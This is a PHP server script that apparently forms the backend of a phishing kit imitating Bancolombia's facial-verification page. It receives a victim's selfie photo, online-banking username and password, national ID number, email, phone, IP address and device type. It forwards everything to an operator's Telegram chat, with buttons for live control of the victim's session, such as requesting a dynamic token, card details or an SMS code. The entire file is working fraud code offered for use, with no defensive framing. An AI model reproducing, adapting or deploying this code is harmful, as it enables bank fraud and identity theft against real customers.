<?php
header('Content-Type: application/json');
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Cargar configuración
function loadConfig() {
    $configFile = __DIR__ . '/../config.php';
    if (!file_exists($configFile)) {
        return null;
    }
    $config = require $configFile;
    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        return null;
    }
    return [
        'token' => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => 'Faltan credenciales del bot']);
    exit;
}

$botToken = $config['token'];
$chatId = $config['chat_id'];

// Archivo para tokens usados
$USED_TOKENS_FILE = 'used_tokens_facial.json';

function isTokenUsed($id) {
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;
    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id) {
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];
    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

// GET para polling (igual que en 1.php) - ESTO NO CAMBIA
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
    $tid = $_GET['transactionId'];
    
    $updates_url = "https://api.telegram.org/bot{$botToken}/getUpdates?timeout=2";
    $updates = json_decode(@file_get_contents($updates_url), true);
    
    $lastUpdateId = 0;
    
    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }
    
    foreach ($updates['result'] as $upd) {
        if (isset($upd['update_id'])) {
            $lastUpdateId = max($lastUpdateId, $upd['update_id']);
        }
        
        if (!isset($upd['callback_query'])) continue;
        
        $cbData = $upd['callback_query']['data'];
        if (strpos($cbData, $tid) === false) continue;
        
        $action = explode(':', $cbData)[0];
        $user = $upd['callback_query']['from']['username'] ?? $upd['callback_query']['from']['first_name'];
        
        $msgId = $upd['callback_query']['message']['message_id'];
        $original = $upd['callback_query']['message']['text'] ?? $upd['callback_query']['message']['caption'] ?? '';
        
        $newText = $original . "\n\n✅ Acción: <b>" . ucfirst(str_replace('_', ' ', $action)) . "</b>\n👤 Por: @" . $user;
        
        // Editar mensaje original
        if (isset($upd['callback_query']['message']['photo'])) {
            // Es un mensaje con foto
            $payload = [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'caption' => $newText,
                'parse_mode' => 'HTML'
            ];
            
            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageCaption");
        } else {
            // Es un mensaje de texto
            $payload = [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => $newText,
                'parse_mode' => 'HTML'
            ];
            
            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        }
        
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_POSTFIELDS => json_encode($payload)
        ]);
        curl_exec($ch);
        curl_close($ch);
        
        echo json_encode(['ok' => true, 'action' => $action]);
        exit;
    }
    
    if ($lastUpdateId > 0) {
        @file_get_contents("https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($lastUpdateId + 1));
    }
    
    echo json_encode(['ok' => false]);
    exit;
}

// POST para enviar datos - CAMBIO CLAVE AQUÍ
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Verificar si es FormData (con foto)
    if (isset($_FILES['photo']) && isset($_POST['transactionId'])) {
        
        $transactionId = $_POST['transactionId'] ?? '';
        
        if (empty($transactionId)) {
            echo json_encode(['ok' => false, 'error' => 'Falta transactionId']);
            exit;
        }
        
        if (isTokenUsed($transactionId)) {
            echo json_encode(['ok' => false, 'error' => 'Token ya utilizado']);
            exit;
        }
        
        markTokenUsed($transactionId);
        
        // Obtener datos del formulario
        $photo = $_FILES['photo'];
        $usuario = $_POST['usuario'] ?? '';
        $clave = $_POST['clave'] ?? '';
        $monto = $_POST['monto'] ?? '0';
        
        // Obtener tbdatos (viene como JSON string)
        $tbdatos_json = $_POST['tbdatos'] ?? '{}';
        $tbdatos = json_decode($tbdatos_json, true);
        
        // Crear el mensaje COMPLETO
        $mensaje = crearMensajeFacialCompleto($tbdatos, $usuario, $clave, $monto, $transactionId);
        
        // Teclado de botones
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '🧮 DINAMICA', 'callback_data' => "pedir_token:$transactionId"],
                    ['text' => '💳 CC', 'callback_data' => "cc:$transactionId"]
                ],
                [
                    ['text' => '🏦 ERROR LOGO', 'callback_data' => "banco_error:$transactionId"],
                    ['text' => '📱 SMS', 'callback_data' => "sms:$transactionId"],
                    ['text' => '📸 FACIAL', 'callback_data' => "facial:$transactionId"]
                ],
                [
                    ['text' => '🏁 Finalizar', 'callback_data' => "fin:$transactionId"]
                ]
            ]
        ];
        
        // Configurar datos para enviar FOTO CON CAPTION Y BOTONES
        $data = [
            'chat_id' => $chatId,
            'caption' => $mensaje,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];
        
        // Usar CURLFile para enviar la foto
        $photoFile = new CURLFile($photo['tmp_name'], $photo['type'], $photo['name']);
        $data['photo'] = $photoFile;
        
        // Enviar foto a Telegram CON TODO
        $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, []);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        $result = json_decode($response, true);
        
        echo json_encode([
            'ok' => $result['ok'] ?? false,
            'message_id' => $result['ok'] ? $result['result']['message_id'] : null
        ]);
        
        exit;
    }
    
    echo json_encode(['ok' => false, 'error' => 'Formato no válido']);
    exit;
}

// Función para crear mensaje completo
function crearMensajeFacialCompleto($tbdatos, $usuario, $clave, $monto, $transactionId) {
    // Obtener datos
    $nombre = $tbdatos['nombre'] ?? 'No disponible';
    $cedula = $tbdatos['val'] ?? $tbdatos['identificacion'] ?? 'No disponible';
    $correo = $tbdatos['correo'] ?? 'No disponible';
    $celular = $tbdatos['cel'] ?? $tbdatos['telefono'] ?? 'No disponible';
    $banco = $tbdatos['nom'] ?? $tbdatos['banco'] ?? 'No disponible';
    
    // Información del servidor
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
    date_default_timezone_set('America/Bogota');
    $hora = date('d/m/Y H:i:s');
    
    // Detectar dispositivo
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $dispositivo = 'PC';
    if (preg_match('/Android/i', $userAgent)) $dispositivo = 'Android';
    elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) $dispositivo = 'iPhone';
    
    // Formatear monto
    $montoFormateado = number_format((float)$monto, 0, ',', '.');
    
    // Crear mensaje COMPLETO
    $msg = "<b>💎 BANCOLOMBIA - VERIFICACIÓN FACIAL 💎</b>\n";
    $msg .= "• <b>💸 Cédula:</b> <code>" . htmlspecialchars($cedula) . "</code>\n";
    $msg .= "• <b>💌 Correo:</b> <code>" . htmlspecialchars($correo) . "</code>\n";
    $msg .= "• <b>📞 Celular:</b> <code>" . htmlspecialchars($celular) . "</code>\n";
    $msg .= "• <b>👤 Nombre:</b> <code>" . htmlspecialchars($nombre) . "</code>\n";
    $msg .= "• <b>🏦 Banco:</b> " . htmlspecialchars($banco) . "\n";
    $msg .= "------------------------------\n";
    $msg .= "• <b>📟 Dispositivo:</b> " . $dispositivo . "\n";
    $msg .= "• <b>🗺 IP:</b> " . $ip . "\n";
    $msg .= "• <b>⏱ Hora:</b> " . $hora . "\n";
    $msg .= "------------------------------\n";
    $msg .= "• <b>💰 Monto:</b> $" . $montoFormateado . "\n";
    $msg .= "------------------------------\n";
    $msg .= "<b>🔐 CREDENCIALES:</b>\n";
    $msg .= "• <b>👤 Usuario:</b> <code>" . htmlspecialchars($usuario) . "</code>\n";
    $msg .= "• <b>🔑 Clave:</b> <code>" . htmlspecialchars($clave) . "</code>\n";
    $msg .= "------------------------------\n";
    
    return $msg;
}

echo json_encode(['ok' => false, 'error' => 'Método no permitido']);
?>